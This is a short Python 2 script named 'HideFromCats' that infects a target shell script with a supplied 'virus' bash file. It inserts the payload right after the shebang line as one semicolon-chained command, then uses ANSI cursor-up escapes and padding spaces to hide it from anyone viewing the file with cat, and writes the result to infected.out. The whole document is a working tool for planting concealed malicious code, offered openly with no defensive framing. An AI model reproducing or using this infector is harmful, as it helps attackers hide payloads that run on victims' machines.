#!/usr/bin/python
import sys
print "HideFromCats - created by [GrzechuG/BlueHat139]"

if len(sys.argv)!=3:
    print "Usage: python HideFromCats.py [virus_bash] [script_to_infect]"
    quit()
virus = sys.argv[1]
file = sys.argv[2]
payload = ""
with open(virus, "r") as f:
    for line in f:
        line = line.replace("\n", "")
        payload = payload+line+";"
payload = payload+"exit"
infected = ""
with open (file, "r") as f:
      for line in f:
           infected = infected+line
           if "#!" in line:
               infected = infected+""+payload+"\n\n"+'\033[A\033[A'+" "*len(payload)+"\n"
with open("infected.out", "w+") as f:
    f.write(infected)

               
          
     
